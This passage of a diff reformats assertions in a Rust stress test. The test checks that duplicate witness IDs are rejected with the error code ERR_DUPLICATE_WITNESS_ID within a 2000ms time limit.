+            duplicate_elapsed.as_millis() < 2_000,
             "Duplicate detection stress test took {}ms, should be <2000ms",
-            duplicate_elapsed.as_millis());
+            duplicate_elapsed.as_millis()
+        );
 
         // Should detect duplicates properly
         match duplicate_result {
             Ok(_) => panic!("Duplicate witnesses should be rejected"),
             Err(error) => {
-                assert_eq!(error.code(), "ERR_DUPLICATE_WITNESS_ID",
-                    "Should detect duplicate witnesses in stress scenario");
+                assert_eq!(
+                    error.code(),
+                    "ERR_DUPLICATE_WITNESS_ID",
+                    "Should detect duplicate witnesses in stress scenario"
+                );
             }
         }
     }
